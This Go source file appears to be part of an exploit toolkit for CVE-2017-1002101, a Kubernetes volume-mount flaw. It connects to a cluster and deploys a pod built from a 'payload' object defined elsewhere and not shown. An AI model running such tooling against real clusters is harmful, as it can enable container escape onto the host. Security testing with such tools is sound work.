package CVE_2017_1002101

import (
	"context"
	"flag"
	"github.com/sirupsen/logrus"
	"github.com/ssst0n3/awesome_libs/awesome_error"
	log2 "github.com/ssst0n3/awesome_libs/log"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
	"os"
)

const ExpName = "CVE-2017-1002101"

func getClient(masterUrl, kubeconfigPath string) (clientset *kubernetes.Clientset, err error) {
	log2.Logger.Debugf("masterUrl: %s\tkubeconfigPath: %s", masterUrl, kubeconfigPath)
	config, err := clientcmd.BuildConfigFromFlags(masterUrl, kubeconfigPath)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	clientset, err = kubernetes.NewForConfig(config)
	if err != nil {
		awesome_error.CheckErr(err)
		return
	}
	return
}

func Deploy(masterUrl, kubeconfigPath, namespace string) (err error) {
	clientset, err := getClient(masterUrl, kubeconfigPath)
	if err != nil {
		return err
	}
	_, err = clientset.CoreV1().Pods(namespace).Create(context.TODO(), &payload, metav1.CreateOptions{})
	if err != nil {
		return
	}
	return
}

func Exploit() {
	flagSet := flag.NewFlagSet(ExpName, flag.ContinueOnError)
	var debug bool
	var masterUrl, kubeconfigPath, namespace string
	flagSet.BoolVar(&debug, "debug", false, "")
	flagSet.StringVar(&masterUrl, "master_url", "", "")
	flagSet.StringVar(&kubeconfigPath, "kubeconfig", "", "")
	flagSet.StringVar(&namespace, "namespace", "default", "")
	awesome_error.CheckFatal(flagSet.Parse(os.Args[1:]))
	if debug {
		log2.Logger.Level = logrus.DebugLevel
	}
	err := Deploy(masterUrl, kubeconfigPath, namespace)
	awesome_error.CheckFatal(err)
}
